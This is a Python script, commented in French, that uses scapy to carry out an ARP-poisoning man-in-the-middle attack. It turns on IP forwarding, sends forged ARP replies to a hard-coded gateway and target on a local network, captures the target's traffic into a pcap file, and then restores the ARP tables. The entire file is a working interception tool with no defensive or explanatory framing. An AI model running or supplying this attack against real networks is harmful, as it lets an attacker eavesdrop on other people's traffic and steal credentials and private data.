 # -*-coding:Latin-1 -*

from scapy.all import *
import os
import signal
import sys
import threading
import time
#Chargement des librairies

#Paramétrage des variables
gateway_ip = "192.168.0.254"
target_ip = "192.168.0.100"
packet_count = 10000
conf.iface = "eth0"
conf.verb = 0

#Définition des fonctions

#Fonction pour restaurer le réseau
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Déactive IP Forwarding")
    #Déactive IP Forwarding 
    os.system("sysctl -w net.ipv4.ip_forward=0")
    #supprime le processus
    os.kill(os.getpid(), signal.SIGTERM)

#Obtenir l'adresse mac de l'adresse ip cible
def get_mac(ip_address):
    # Création des requêtes ARP 
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

#Envoi l'arp à la cible
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Envoi l'arp à la cible [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stop l'arp à la cible, Restauration du réseau")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

#Execution du code
#Start
print("[*] Initialisation du script: sniffer.py")
print("[*] Active IP Forwarding")
#Active IP Forwarding 
os.system("sysctl -w net.ipv4.ip_forward=1")
print("[*] Gateway IP: {gateway_ip}")
print("[*] Target IP: {target_ip}")

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Impossible d'obtenir l'adresse MAC. Bye..")
    sys.exit(0)
else:
    print("[*] Gateway MAC: {gateway_mac}")

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Impossible d'obtenir l'adresse de la target MAC. Exiting..")
    sys.exit(0)
else:
    print("[*] Target MAC : {target_mac}")

#Thread de ARP poisonning
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

#Sniff et exporte dans un fichier pcap
try:
    sniff_filter = "ip host " + target_ip
    print("[*] Début de la capture réseau. Packet Count: {packet_count}. Filter: {sniff_filter}")
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
    wrpcap(target_ip + "_capture.pcap", packets)#Extraction pcap
    print("[*] Arrêt de la capture..Restauration du réseau")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    print("[*] Arrêt de la capture..Restauration du réseau")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)


